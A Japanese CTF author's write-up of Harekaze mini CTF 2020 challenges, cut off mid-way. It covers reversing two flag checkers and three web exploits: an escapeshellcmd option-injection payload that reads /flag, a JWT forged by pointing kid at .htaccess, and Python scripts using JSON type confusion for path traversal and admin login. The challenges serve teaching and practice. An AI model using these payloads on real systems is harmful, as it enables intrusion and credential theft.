---
layout: post
title: Harekaze mini CTF 2020 で出題した問題の解説
categories: [ctf, harekaze]
date: 2020-12-29 07:00:00 +0900
---

12 月 26 日から 12 月 27 日にかけて、チーム Harekaze は [Harekaze mini CTF 2020](https://harekaze.com/ctf/2020-jp.html) を開催しました。登録チーム数は 175 チーム、1 問以上を解いたチームは 141 チームと、多くの方にご参加いただきました。ありがとうございました。

[TeamHarekaze/harekaze-mini-ctf-2020-challenges-public](https://github.com/TeamHarekaze/harekaze-mini-ctf-2020-challenges-public) ですべての問題 (と問題サーバのソースコード) を公開していますので、当日参加されなかった/できなかった方もぜひ挑戦してみてください。復習にもぜひ。

また、問題の感想などについてのアンケートはまだ回答できますので、答えていただけるとうれしいです: [https://forms.gle/vt9N4HuA8UzTe3Ve8](https://forms.gle/vt9N4HuA8UzTe3Ve8)

---

さて、この記事では私が出題した以下の 7 問について解説します。

- [[Reversing 130] Easy Flag Checker](#reversing-130-easy-flag-checker-55-solves)
- [[Reversing 193] Tiny Flag Checker](#reversing-193-tiny-flag-checker-23-solves)
- [[Web 123] What time is it now?](#web-123-what-time-is-it-now-63-solves)
- [[Web 210] JWT is secure](#web-210-jwt-is-secure-19-solves)
- [[Web 305] Avatar Viewer](#web-305-avatar-viewer-8-solves)
- [[Web 322] WASM BF](#web-322-wasm-bf-7-solves)
- [[Misc 322] Proxy Sandbox](#misc-322-proxy-sandbox-7-solves)

他の作問者の解説は以下の記事を参照ください。

- [Harekaze mini CTF 2020 Writeup - h_nosonの日記](https://h-noson.hatenablog.jp/entry/2020/12/27/205915)
- [Harekaze mini CTF 2020 作問者writeup - ふるつき](https://furutsuki.hatenablog.com/entry/2020/12/27/160652)

## [Reversing 130] Easy Flag Checker (55 solves)
> このバイナリに文字列を与えると、フラグであるかどうかチェックしてくれます。
> 
> ---
> 
> This binary checks if the input is the flag
> 
> ---
> 
> 想定難易度: warmup  
> 添付ファイル: [chall](../files/20201227-harekaze-mini-ctf-2020/chall)

`chall` がどのようなファイルか確認してみましょう。

```
$ file ./chall 
./chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=cf6babcec9c03080b398365682a093ef29f3a83b, for GNU/Linux 3.2.0, not stripped
```

x86_64 の ELF のようです。実行してみましょう。

```
$ chmod +x chall
$ ./chall
Input flag: hoge
Nope.
```

フラグを聞かれました。[Ghidra](https://ghidra-sre.org/) でデコンパイルし、どのような処理で入力した文字列がチェックされているか確認します。

```c
int main(void)

{
  long lVar1;
  int iVar2;
  long in_FS_OFFSET;
  char user_input [40];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Input flag: ");
  __isoc99_scanf(&DAT_00402015,user_input);
  iVar2 = check(user_input,"fakeflag{this_is_not_the_real_flag}");
  if (iVar2 == 0) {
    printf("Congratulations! The flag is: %s\n",user_input);
  }
  else {
    puts("Nope.");
  }
  if (lVar1 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

入力した文字列がフラグであれば `check` という関数は `0` を返すようです。第一引数にユーザ入力が、第二引数に `fakeflag{this_is_not_the_real_flag}` が渡されていますが、これがフラグなわけがありません。

`check` を読んでいきましょう。`funcs` というのは関数ポインタの配列でしょう。`funcs[i % 3](fake_flag[i], table[i])` と、先程の偽フラグの `i` 文字目と `table` という謎の配列の `i` 番目の要素を引数として関数を読んでいます。

```c
int check(char *user_input,char *fake_flag)

{
  char c;
  int i;
  
  i = 0;
  while( true ) {
    if (0x22 < i) {
      return 0;
    }
    c = (**(code **)(funcs + (long)(i % 3) * 8))
                  ((ulong)(uint)(int)fake_flag[i],(ulong)(uint)(int)(char)table[i],
                   (ulong)(uint)(int)(char)table[i]);
    if (c < user_input[i]) break;
    if (user_input[i] < c) {
      return -1;
    }
    i = i + 1;
  }
  return 1;
}
```

`funcs` には `add`、`sub`、`xor` という関数が順番に入っています。これらの処理を読んでみると、いずれも簡単な処理であることがわかります。

```c
char add(char a,char b)

{
  return b + a;
}

char sub(char a,char b)

{
  return a - b;
}

char xor(char a,char b)

{
  return a ^ b;
}
```

偽フラグと `table` の要素を使ってフラグを復元しましょう。

```python
import struct

us = lambda x: struct.unpack('b', x)[0]

with open('chall', 'rb') as f:
  f.seek(0x3060)

  flag = ''
  for i, c in enumerate(b'fakeflag{this_is_not_the_real_flag}'):
    d = f.read(1)
    if i % 3 == 0:
      flag += chr(c + us(d))
    elif i % 3 == 1:
      flag += chr(c - us(d))
    elif i % 3 == 2:
      flag += chr(c ^ ord(d))

  print(flag)
```

```
$ python solve.py
HarekazeCTF{0rth0d0x_fl4g_ch3ck3r!}
```

フラグが得られました。

```
HarekazeCTF{0rth0d0x_fl4g_ch3ck3r!}
```

---

デコンパイルなりなんなりで簡単に解ける問題として作りました。[angr](https://github.com/angr/angr) に食わせるとすぐ解けるようです。すご。

## [Reversing 193] Tiny Flag Checker (23 solves)
> キーを当ててください。
> 
> ---
> 
> Guess the key.
> 
> ---
> 
> 想定難易度: medium  
> 添付ファイル: [tiny](../files/20201227-harekaze-mini-ctf-2020/tiny)

`tiny` がどのようなファイルか `file` コマンドで確認してみましょう。

```
$ file tiny 
tiny: ELF, unknown class 85
```

謎の ELF ファイルです。`readelf` でも読んでみましょう。

```
$ readelf -h tiny 
ELF Header:
  Magic:   7f 45 4c 46 55 55 4e 5f 4b 41 57 41 49 49 16 c6 
  Class:                             <unknown: 55>
  Data:                              <unknown: 55>
  Version:                           78 <unknown>
  OS/ABI:                            <unknown: 5f>
  ABI Version:                       75
  Type:                              EXEC (Executable file)
  Machine:                           Advanced Micro Devices X86-64
  Version:                           0x44434241
  Entry point address:               0x4000a2
  Start of program headers:          0 (bytes into file)
  Start of section headers:          64 (bytes into file)
  Flags:                             0x0
  Size of this header:               64743 (bytes)
  Size of program headers:           30051 (bytes)
  Number of program headers:         53091
  Size of section headers:           61693 (bytes)
  Number of section headers:         44646
  Section header string table index: 20444
readelf: Warning: The e_shentsize field in the ELF header is larger than the size of an ELF section header
readelf: Error: Reading 2754345678 bytes extends past end of file for section headers
readelf: Error: Too many program headers - 0xcf63 - the file is not that big
```

ヘッダがぶっ壊れていますが、`Machine` の項目から x86_64 の実行ファイルであることと、エントリーポイントが `0x4000a2` であることはわかります。実行してみましょう。

```
$ ./tiny
Input: hoge
Nope...
```

フラグを聞かれました。どのような処理がされているか `objdump` で見てみましょう。

```
$ objdump -D -b binary -m i386:x86-64 -M intel tiny

tiny:     file format binary


Disassembly of section .data:

0000000000000000 <.data>:
   0:   7f 45                   jg     0x47
   2:   4c                      rex.WR
   3:   46 55                   rex.RX push rbp
   5:   55                      push   rbp
...
  91:   46 7b 7d                rex.RX jnp 0x111
  94:   0a b8 01 00 00 00       or     bh,BYTE PTR [rax+0x1]
  9a:   bf 01 00 00 00          mov    edi,0x1
  9f:   0f 05                   syscall 
  a1:   c3                      ret    
  a2:   48 83 ec 10             sub    rsp,0x10
  a6:   49 89 e0                mov    r8,rsp
  a9:   48 83 ec 10             sub    rsp,0x10
  ad:   49 89 e1                mov    r9,rsp
  b0:   66 0f ef c0             pxor   xmm0,xmm0
  b4:   0f 29 04 24             movaps XMMWORD PTR [rsp],xmm0
  b8:   0f 29 44 24 10          movaps XMMWORD PTR [rsp+0x10],xmm0
  bd:   be 70 00 40 00          mov    esi,0x400070
  c2:   ba 07 00 00 00          mov    edx,0x7
  c7:   e8 c9 ff ff ff          call   0x95
  cc:   31 c0                   xor    eax,eax
  ce:   31 ff                   xor    edi,edi
  d0:   4c 89 c6                mov    rsi,r8
  d3:   ba 10 00 00 00          mov    edx,0x10
  d8:   0f 05                   syscall 
  da:   49 8b 00                mov    rax,QWORD PTR [r8]
  dd:   49 31 01                xor    QWORD PTR [r9],rax
  e0:   49 8b 40 08             mov    rax,QWORD PTR [r8+0x8]
  e4:   49 31 41 08             xor    QWORD PTR [r9+0x8],rax
  e8:   49 c1 09 29             ror    QWORD PTR [r9],0x29
  ec:   49 c1 49 08 13          ror    QWORD PTR [r9+0x8],0x13
  f1:   48 8b 04 25 00 00 40    mov    rax,QWORD PTR ds:0x400000
  f8:   00 
  f9:   49 31 01                xor    QWORD PTR [r9],rax
  fc:   48 8b 04 25 08 00 40    mov    rax,QWORD PTR ds:0x400008
 103:   00 
 104:   49 31 41 08             xor    QWORD PTR [r9+0x8],rax
 108:   48 8b 04 25 28 00 40    mov    rax,QWORD PTR ds:0x400028
 10f:   00 
 110:   49 33 01                xor    rax,QWORD PTR [r9]
 113:   48 8b 14 25 30 00 40    mov    rdx,QWORD PTR ds:0x400030
 11a:   00 
 11b:   49 33 51 08             xor    rdx,QWORD PTR [r9+0x8]
 11f:   48 21 c0                and    rax,rax
 122:   75 32                   jne    0x156
 124:   48 39 d0                cmp    rax,rdx
 127:   75 2d                   jne    0x156
 129:   be 78 00 40 00          mov    esi,0x400078
 12e:   ba 1b 00 00 00          mov    edx,0x1b
 133:   e8 5d ff ff ff          call   0x95
 138:   4c 89 c6                mov    rsi,r8
 13b:   ba 10 00 00 00          mov    edx,0x10
 140:   e8 50 ff ff ff          call   0x95
 145:   be 93 00 40 00          mov    esi,0x400093
 14a:   ba 02 00 00 00          mov    edx,0x2
 14f:   e8 41 ff ff ff          call   0x95
 154:   eb 0f                   jmp    0x165
 156:   be 58 00 40 00          mov    esi,0x400058
 15b:   ba 08 00 00 00          mov    edx,0x8
 160:   e8 30 ff ff ff          call   0x95
 165:   b8 3c 00 00 00          mov    eax,0x3c
 16a:   31 ff                   xor    edi,edi
 16c:   0f 05                   syscall 
```

先程 `readelf` で確認したように、`a2` が `sub rsp, 0x10` とエントリーポイントっぽい命令で始まっています。どのような処理がされているか読んでみましょう。

まず `a2` から `b8` で `r8` と `r9` というレジスタにそれぞれ別の 16 バイトの配列のアドレスを格納し、それをゼロクリアしています。

```
  a2:   48 83 ec 10             sub    rsp,0x10
  a6:   49 89 e0                mov    r8,rsp
  a9:   48 83 ec 10             sub    rsp,0x10
  ad:   49 89 e1                mov    r9,rsp
  b0:   66 0f ef c0             pxor   xmm0,xmm0
  b4:   0f 29 04 24             movaps XMMWORD PTR [rsp],xmm0
  b8:   0f 29 44 24 10          movaps XMMWORD PTR [rsp+0x10],xmm0
```

`cc` から `d8` では `xor eax, eax` してから `syscall` を呼んでいますから、`read` でユーザ入力を読み取っていることがわかります。格納先は `mov rsi, r8` から `r8` レジスタの配列であることがわかります。

```
  cc:   31 c0                   xor    eax,eax    ; sys_read
  ce:   31 ff                   xor    edi,edi    ; fd
  d0:   4c 89 c6                mov    rsi,r8     ; buf
  d3:   ba 10 00 00 00          mov    edx,0x10   ; count
  d8:   0f 05                   syscall 
```

`da` から `e4` では、`r8` の配列に格納されたユーザ入力を `r9` の配列に丸々コピーしています。

```
  da:   49 8b 00                mov    rax,QWORD PTR [r8]
  dd:   49 31 01                xor    QWORD PTR [r9],rax
  e0:   49 8b 40 08             mov    rax,QWORD PTR [r8+0x8]
  e4:   49 31 41 08             xor    QWORD PTR [r9+0x8],rax
```

`e8` から `11f` では、まず `e8` から `104` までで XOR や ROR によってユーザ入力を加工し、`108` 以降で `0x400028` と `0x400030` に格納されているバイト列と XOR で比較していることがわかります。

```
  e8:   49 c1 09 29             ror    QWORD PTR [r9],0x29
  ec:   49 c1 49 08 13          ror    QWORD PTR [r9+0x8],0x13
  f1:   48 8b 04 25 00 00 40    mov    rax,QWORD PTR ds:0x400000
  f8:   00 
  f9:   49 31 01                xor    QWORD PTR [r9],rax
  fc:   48 8b 04 25 08 00 40    mov    rax,QWORD PTR ds:0x400008
 103:   00 
 104:   49 31 41 08             xor    QWORD PTR [r9+0x8],rax
 108:   48 8b 04 25 28 00 40    mov    rax,QWORD PTR ds:0x400028
 10f:   00 
 110:   49 33 01                xor    rax,QWORD PTR [r9]
 113:   48 8b 14 25 30 00 40    mov    rdx,QWORD PTR ds:0x400030
 11a:   00 
 11b:   49 33 51 08             xor    rdx,QWORD PTR [r9+0x8]
 11f:   48 21 c0                and    rax,rax
```

`e8` から `11f` の逆の処理をする Python スクリプトを書きましょう。

```python
import binascii
import struct

def rol(x, shift):
  return ((x << shift) | (x >> (64 - shift))) & 0xffffffffffffffff

def unhex(x):
  return binascii.unhexlify(hex(x)[2:])[::-1]

with open('tiny', 'rb') as f:
  elf = f.read()

k1, k2 = struct.unpack('QQ', elf[:0x10])
k3, k4 = struct.unpack('QQ', elf[0x28:0x38])

flag = ''
flag += unhex(rol(k1 ^ k3, 0x29)).decode()
flag += unhex(rol(k2 ^ k4, 0x13)).decode()
print(flag)
```

```
$ python solve.py
fl4g_1s_t1ny_t00
```

バイナリを実行して入力してみます。

```
$ ./tiny 
Input: fl4g_1s_t1ny_t00
Correct! Flag: HarekazeCTF{fl4g_1s_t1ny_t00}
```

フラグが得られました。

```
HarekazeCTF{fl4g_1s_t1ny_t00}
```

---

この ELF は [76Byte の Hello world - 兼雑記](http://shinh.hatenablog.com/entry/20060911/1157921389)や [StalkR's Blog: Tiny ELF 32/64 with nasm](https://blog.stalkr.net/2014/10/tiny-elf-3264-with-nasm.html) などの記事を参考に[手書き](https://github.com/TeamHarekaze/harekaze-mini-ctf-2020-challenges-public/blob/a19b3146339e71bd28269b7781e43f0105b186f4/rev/tiny-flag-checker/challenge/tiny.asm)で作りました。逆アセンブルさえできればあとは簡単だと思います。

## [Web 123] What time is it now? (63 solves)
> そうねだいたいね…
> 
> (URL)
> 
> ---
> 
> It's about ...
> 
> (URL)
> 
> ---
> 
> 想定難易度: warmup  
> 添付ファイル: [what-time-is-it-now.zip](../files/20201227-harekaze-mini-ctf-2020/what-time-is-it-now.zip)

添付ファイルを展開するとソースコードが出てきます。まず `Dockerfile` から見ていきましょう。

```
FROM php:7.4-apache

ADD public/index.php /var/www/html/

RUN chmod -R 755 /var/www
RUN chown root:root /var/www

RUN echo "HarekazeCTF{<censored>}" > "/flag"
RUN chmod -R 755 /flag*
```

`echo "HarekazeCTF{<censored>}" > "/flag"` からフラグは `/flag` にあることがわかります。

`index.php` を見てみましょう。

```php
<?php
if (isset($_GET['source'])) {
  highlight_file(__FILE__);
  exit;
}

$format = isset($_REQUEST['format']) ? (string)$_REQUEST['format'] : '%H:%M:%S';
$result = shell_exec("date '+" . escapeshellcmd($format) . "' 2>&1");
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>What time is it now?</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
  </head>
  <body>
   <header>
      <nav class="navbar navbar-expand-lg navbar-dark bg-dark">
        <div class="container">
          <a class="navbar-brand" href="index.php">What time is it now?</a>
          <div class="navbar-collapse">
            <ul class="navbar-nav mr-auto">
              <li class="nav-item"><a class="nav-link" href="?source">Source Code</a></li>
            </ul>
          </div>
        </div>
      </nav>
    </header>
    <main>
      <section class="jumbotron text-center">
        <div class="container">
          <h1 class="jumbotron-heading"><span class="text-muted">It's</span> <?= isset($result) ? $result : '?' ?><span class="text-muted">.</span></h1>
          <p>
            <a href="?format=%H:%M:%S" class="btn btn-outline-secondary">What time is it now?</a>
            <a href="?format=%Y-%m-%d" class="btn btn-outline-secondary">What is the date today?</a>
            <a href="?format=%s" class="btn btn-outline-secondary">What time is it now in UNIX time?</a>
          </p>
        </div>
      </section>
    </main>
    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js" integrity="sha384-J6qa4849blE2+poT4WnyKhv5vZF5SrPo0iEjwBvKU7imGFAV0wwj1yYfoRSJoZ+n" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
  </body>
</html>
```

`shell_exec("date '+" . escapeshellcmd($format) . "' 2>&1")` から、`date` というコマンドを使って好きなフォーマットで現在時刻を表示できるようにしていることがわかります。`$format` は `$_REQUEST['format']` とユーザ入力から受け取っています。

OS コマンドインジェクションができそうな気もしますが、`$format` は `escapeshellcmd` という関数に通されているため難しそうです。例えば、`'; id; #` を与えると `\'\; id\; \#` のようにエスケープされてしまうために OS コマンドインジェクションが成立しません。

`escapeshellcmd` によるエスケープを回避できるようなパターンはないでしょうか。[この関数のドキュメント](https://www.php.net/manual/ja/function.escapeshellcmd.php)を参照してみると、次のような記述が見つかります。

> …' および " は、対になっていない場合にのみエスケープされます。…

つまり、`'` は[対になっていればエスケープされません](https://blog.tokumaru.org/2011/01/php-escapeshellcmd-is-dangerous.html)。試してみましょう。

```
$ psysh
...
>>> echo escapeshellcmd("' abc")
\' abc⏎
>>> echo escapeshellcmd("' 'abc")
' 'abc⏎
```

確かに、対になっている `'` はエスケープされていません。これを使えば、例えば `$format` に `' --hoge '` というような文字列を仕込むと実行される OS コマンドは `date '+' --hoge '' 2>&1` のようになり、`--hoge` というオプションを追加できます。ただ、`;` や `#` などの記号はエスケープされてしまうので、`date` 以外のコマンドを実行させられるようにはできません。

`date` コマンドで使えるオプションの中に、ファイルを読み込めるようなものはないでしょうか。`man` で見てみましょう。

```
$ man date
...

       -f, --file=DATEFILE
              like --date; once for each line of DATEFILE
...
```

ありました。`' -f'/flag` ならどうでしょうか。`?format='%20-f'/flag` にアクセスしてみます。

```html
...
        <div class="container">
          <h1 class="jumbotron-heading"><span class="text-muted">It's</span> date: invalid date 'HarekazeCTF{1t\'s_7pm_1n_t0ky0}'
<span class="text-muted">.</span></h1>
          <p>
            <a href="?format=%H:%M:%S" class="btn btn-outline-secondary">What time is it now?</a>
            <a href="?format=%Y-%m-%d" class="btn btn-outline-secondary">What is the date today?</a>
            <a href="?format=%s" class="btn btn-outline-secondary">What time is it now in UNIX time?</a>
          </p>
        </div>
...
```

フラグが表示されました。

```
HarekazeCTF{1t's_7pm_1n_t0ky0}
```

---

PHP のドキュメントやら `man` やら、まずドキュメントを調べるといいことがあるかもという問題です。

はじめはオプションを `"` で囲んで、エスケープはせず `'` や `"` を削除するだけというもっと単純な OS コマンドインジェクション問でした。が、問題チェックの際にやはり典型すぎるという感想をいただいてこのように修正しました。

フラグは「東京は夜の七時」です。提出ログを眺めていると、`HarekazeCTF{1t\'s_7pm_1n_t0ky0}` のように `\` を付けたまま提出されている方が多く見られて (この問題を解いた 63 チームのうち、40 チームが正解フラグの提出前にそのような提出をしていました…) 申し訳ない気持ちになりました。`'` を含まないフラグにすべきでしたね。

## [Web 210] JWT is secure (19 solves)
> 独自に作ったセッション機能は脆弱性を作り込みがちだということを学んだので、今回はJWT (JSON Web Token)を採用しました。
> 
> (URL)
> 
> ---
> 
> I learned implementing a custom session function is prone to be insecure, so this time I adopted JWT (JSON Web Token).
> 
> (URL)
> 
> ---
> 
> 想定難易度: easy  
> 添付ファイル: [jwt-is-secure.zip](../files/20201227-harekaze-mini-ctf-2020/jwt-is-secure.zip)

与えられた URL にアクセスすると `You need to log in to access this page!` と表示されます。ログインフォームでは `admin` 以外の好きなユーザ名を入力してログインできますが、`role` が `user` であるために `admin page` を閲覧することができないと表示されます。

![you cannot access admin page](../images/2020-12-29_jwt-is-secure1.png)

セッションがどのように保存されているか Cookie を見てみると、`jwtsession` というキーで以下のような JWT が含まれていることがわかります。

```
eyJ0eXAiOiJKV1QiLCJraWQiOiJhZWQzNDkyYTI4ODY3OWM3IiwiYWxnIjoiSFMyNTYifQ.eyJ1c2VybmFtZSI6ImhvZ2UiLCJyb2xlIjoidXNlciJ9.0YHPci3ZFGbuWtt2z2Q7OF6TruBADp7i8XfysKBePr8
```

[jwt.io](https://jwt.io/) に投げてやるとヘッダに `kid` というパラメータが含まれていることがわかります。どのように使われているかソースコードを見てみましょう。

`session.php` に `kid` パラメータを参照している処理が見つかります。`$kid = $tmp->getHeader('kid')` でまず `kid` パラメータを取り出して、`$this->key = $this->getSecretKey($kid)` で対応する秘密鍵を取得しています。

```php
<?php
include 'jwt.php';

class Session {
  private $cookie_name;
  private $jwt;
  private $key;
  private $base_dir;
  
  public function __construct($cookie_name='jwtsession', $dir='./keys') {
    $this->cookie_name = $cookie_name;
    $this->base_dir = $dir;

    if (array_key_exists($cookie_name, $_COOKIE)) {
      try {
        $tmp = new JWT($_COOKIE[$cookie_name]);
        $kid = $tmp->getHeader('kid');
        $this->key = $this->getSecretKey($kid);

        if (!$tmp->verify($this->key)) {
          throw new Exception('Signature verification failed');
        }

        $this->jwt = $tmp;
      } catch (Exception $e) {
        die('Error occurred: ' . $e->getMessage());
      }
    }

    if (!isset($this->jwt)) {
      $this->jwt = new JWT;
      $kid = bin2hex(random_bytes(8));
      $this->key = bin2hex(random_bytes(64));
      $this->setSecretKey($kid, $this->key);
      $this->jwt->setHeader('kid', $kid);
      $this->save();
    }
  }

  // …
}
```

`getSecretKey` がどのような処理をしているか見てみましょう。

`base_dir` (`./keys`) 下に秘密鍵がファイルとして保存されており、`kid` によって保存先のパスが決まっているようです。`./keys` はドキュメントルートの下にあるので秘密鍵が保存されているファイルにアクセスすればよいのでは、と思ってしまいますが `./keys` には `deny from all` という内容の `.htaccess` が配置されておりアクセスできません。

`..` を使った Path Traversal や `//` や `:` を使ったストリームラッパーによるバイパスは使えそうにありません。

```php
  private function getSecretKey($kid) {
    $dir = $this->base_dir . '/' . $kid[0] . '/' . $kid[1];
    $path = $dir . '/' . $kid;

    // no path traversal, no stream wrapper
    if (preg_match('/\.\.|\/\/|:/', $kid)) {
      throw new Exception('Hacking attempt detected');
    }

    if (!file_exists($path) || !is_file($path)) {
      throw new Exception('Secret key not found');
    }

    return file_get_contents($path);
  }
```

`..` が使えないので `./keys` より上のディレクトリにアクセスすることはできません。`./keys` 下に内容がすでにわかっている都合のよいファイルはないでしょうか。… `.htaccess` がありますね。

適当なユーザでログインし、得られた JWT についてヘッダの `kid` パラメータを `./.htaccess` に、データの `role` を `admin` に変えます。`.htaccess` の内容の `deny from all` を秘密鍵として署名したものを Cookie にセットすると、以下のように admin になることができました。

![adminです](../images/2020-12-29_jwt-is-secure2.png)

`admin page` にアクセスするとフラグが得られました。

![フラグが得られた](../images/2020-12-29_jwt-is-secure3.png)

```
HarekazeCTF{l1st3n_1_just_g1v3_y0u_my_fl4g_4t4sh1_n0_w4v3_w0_t0b4sh1t3_m1ruk4r4}
```

---

ソースコードや与えられたファイルをよく読みましょうという問題にするつもりで作りました。

フラグは問題の内容とは全く関係がありませんが、ゲンキトリッパーです。やはり CTF の作問で一番難しいのはフラグと問題名を考えるパートですね。

## [Web 305] Avatar Viewer (8 solves)
> Avatar Uploaderという名前の問題を覚えていますか? ご存知のように、あのWebアプリには致命的な脆弱性がありました。今回は安全のためにアップロード機能を削除しました。
> 
> (URL)
> 
> ---
> 
> Do you remember the challenges named Avatar Uploader? As you know, that Web app has critical vulnerabilities. This time I removed upload functions for safety.
> 
> (URL)
> 
> ---
> 
> 想定難易度: medium  
> 添付ファイル: [avatar-viewer.zip](../files/20201227-harekaze-mini-ctf-2020/avatar-viewer.zip)

与えられた URL にアクセスすると、以下のような画面が表示されました。ログインが求められていますが、ユーザ登録は閉じられていますし認証情報は与えられていません。仕方がないのでソースコードを読みましょう。

![Avatar Viewerのトップページ](../images/2020-12-29_avatar-viewer1.png)

まずはフラグの場所を確認します。`adminUsername` に格納されているユーザ名でログインしている状態で `/admin` にアクセスすればよさそうです。

```javascript
const flag = process.env.FLAG || 'flag{DUMMY}';
const users = JSON.parse(fs.readFileSync('./users.json'));
const adminUsername = Object.keys(users).filter(k => k.startsWith('admin'))[0];

// ...

app.get('/admin', async (request, reply) => {
  const username = request.session.get('username');
  if (!username) {
    request.flash('error', 'please log in to view this page');
    return reply.redirect('/login');
  }

  if (username != adminUsername) {
    request.flash('error', 'only admin can view this page');
    return reply.redirect('/login');
  }

  return reply.view('index.ejs', { 
    page: 'admin',
    username: request.session.get('username'),
    flash: reply.flash(),
    flag
  });
});
```

ユーザの認証情報は `users.json` から読み出されています。添付ファイルに含まれる `users.json` では `adminUsername` とそのパスワードは隠されています。

```javascript
{
  "guest": "guest",
  "admin-(censored)": "<censored>"
}
```

なんとかして `adminUsername` とそのパスワードを知ることができないでしょうか。ソースコードを読むと、今ログインしているユーザのアイコンが返ってくる `/myavatar.png` に気になる処理が見つかります。

アイコンは `/usr/src/app/images/(ユーザ名)` から読み出されていますが、ユーザ名に `../users.json` を入れることができれば `users.json` を読んで `adminUsername` とそのパスワードを特定することができそうです。

`username` は `includes` メソッドによって `.` `/` `\` が含まれていないか確認されています。が、もし `username` が `['../users.json']` のような配列であればどうでしょうか。`String.prototype.includes` でなく `Array.prototype.includes` が呼び出され、この配列には `'.'` `'/'` `'\'` という要素は存在しないためにチェックを回避できるはずです。`${__dirname}/images/${username}` での結合時にも `username` は自動的に文字列に変換されますから、問題はないはずです。

```javascript
app.get('/myavatar.png', async (request, reply) => {
  const username = request.session.get('username');
  if (!username) {
    request.flash('error', 'please log in to view this page');
    return reply.redirect('/login');
  }

  if (username.includes('.') || username.includes('/') || username.includes('\\')) {
    request.flash('error', 'no hacking!');
    return reply.redirect('/login');
  }

  const imagePath = path.normalize(`${__dirname}/images/${username}`);
  if (!imagePath.startsWith(__dirname)) {
    request.flash('error', 'no hacking!');
    return reply.redirect('/login');
  }

  reply.type('image/png');
  if (fs.existsSync(imagePath)) {
    return fs.readFileSync(imagePath);
  }
  return fs.readFileSync('images/default');
});
```

`/myavatar.png` の `username` は `request.session.get('username')` とセッションから来ています。どうにかして配列にできないでしょうか。

セッションの `username` は `/login` で設定されています。

JavaScript では、オブジェクトの存在しないプロパティにアクセスすると `undefined` が返ってきます。`username` に `['../users.json']` を入れれば、`users` に `../users.json` というプロパティは存在しないので `users[username]` は `undefined` を返すはずです。

また、`undefined == null` ですから、`password` に `null` を入れることができればログインできるはずです。でも、どうすればそんなことができるのでしょうか。

```javascript
app.post('/login', async (request, reply) => {
  if (!request.body) {
    request.flash('error', 'HTTP request body is empty');
    return reply.redirect('/login');
  }

  if (!('username' in request.body && 'password' in request.body)) {
    request.flash('error', 'username or password is not provided');
    return reply.redirect('/login');
  }

  const { username, password } = request.body;
  if (username.length > 16) {
    request.flash('error', 'username is too long');
    return reply.redirect('/login');
  }

  if (users[username] != password) {
    request.flash('error', 'username or password is incorrect');
    return reply.redirect('/login');
  }

  request.session.set('username', username);
  reply.redirect('/profile');
});
```

Fastify は HTTP リクエストの `Content-Type` ヘッダによって [HTTP リクエストボディをパースする方法を変えます](https://www.fastify.io/docs/latest/ContentTypeParser/)。この Web アプリケーションでは `application/x-www-form-urlencoded` に対応するために `fastify-formbody` を使っていますが、Fastify は[デフォルトで `application/json` に対応しています](https://github.com/fastify/fastify/blob/453028bbfbb34a240bddb146549d91261deac495/lib/contentTypeParser.js#L30)。これを利用すれば、JSON を使って `request.body` の `username` や `password` に配列や `null` を入れることができそうです。やってみましょう。

```python
import json
import re
import requests

URL = 'http://(省略)/avatar-viewer/'

sess = requests.Session()
sess.post(URL + 'login', headers={
  'Content-Type': 'application/json'
}, data=json.dumps({
  'username': ['../users.json'],
  'password': None
}))

r = sess.get(URL + 'myavatar.png')
for username, password in r.json().items():
  if username.startswith('admin'):
    break

print(r.text)
```

```
$ python a.py
{
  "guest": "guest",
  "admin-b01b9d62015f8b68": "b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25"
}
```

`adminUsername` とそのパスワードが得られました。あとはこの認証情報を使ってログインするだけ…かと思いきや、`/login` の処理をよく見ると以下のように `username` が 17 文字以上であれば弾かれてしまうことがわかります。

```javascript
  const { username, password } = request.body;
  if (username.length > 16) {
    request.flash('error', 'username is too long');
    return reply.redirect('/login');
  }
```

これも `username` に `['admin-b01b9d62015f8b68']` のような配列を入れれば `username.length` は `1` になるはずですから、チェックを回避できるはずです。やってみましょう。

```python
import json
import re
import requests

URL = 'http://(省略)/avatar-viewer/'

r = requests.post(URL + 'login', headers={
  'Content-Type': 'application/json'
}, data=json.dumps({
  'username': ['admin-b01b9d62015f8b68'],
  'password': 'b56c497ff08f76536631f2cc1100521ffabfece3d2da67c71176d69dcba41a25'
}))

print(r.cookies['avatar-session'])
```

これを実行して出力されたセッション ID を Cookie にセットして URL にアクセスすると、以下のように `admin-b01b9d62015f8b68` としてログインできたことが確認できます。

![adminになれた](../images/2020-12-29_avatar-viewer2.png)

`/admin` にアクセスするとフラグが得られました。

![まじナチュラルスーパーニャン](../images/2020-12-29_avatar-viewer3.png)

```
HarekazeCTF{maji_natural_super_nyan}
```

---

`/admin` から逆算してなにができると嬉しいか、どうすればよいかを考えて調べてほしいなあという気持ちで作った問題でした。

昨年の Harekaze CTF では [Avatar Uploader 1/2](2019-05-21-harekaze-ctf-2019.html#misc-100-avatar-uploader-1) という問題を出題しました。はじめはそのリベンジ問として作り始めたのですが、いつの間にか全然違う問題になっていました。フラグも問題の内容と関係はありません。

## [Web 322] WASM BF (7 solves)
> 今はWebAssemblyの時代です。知らんけど。WebAssemblyを学ぶために、Brainf*ckのインタプリタをCで書いてwasmにコンパイルしてみました。
> 
> (URL)
> 
> ---
> 
